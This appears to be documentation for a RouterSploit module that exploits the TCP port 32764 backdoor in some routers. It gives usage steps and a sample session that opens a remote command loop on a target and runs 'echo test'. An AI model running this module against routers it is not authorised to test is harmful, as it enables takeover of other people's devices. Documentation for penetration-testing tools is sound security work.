## Description

Module exploits backdoor functionality that allows executing commands on operating system level. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use exploits/routers/multi/tcp_32764_rce`
  3. Do: `set target [TargetIP]`
  4. Do: `run`
  5. If device is vulnerable it is possible to execute commands on operating system level.

## Scenarios

```
rsf > use exploits/routers/multi/tcp_32764_rce
rsf (TCP-32764 RCE) > set target 192.168.1.1
[+] target => 192.168.1.1
rsf (TCP-32764 RCE) > run
[*] Running module...
[+] Target is vulnerable
[*] Invoking command loop...

[+] Welcome to cmd. Commands are sent to the target via the execute method.
[*] For further exploitation use 'show payloads' and 'set payload <payload>' commands.

cmd > echo test
[*] Executing 'echo test' on the device...
[*] Connection established
test
cmd >
```
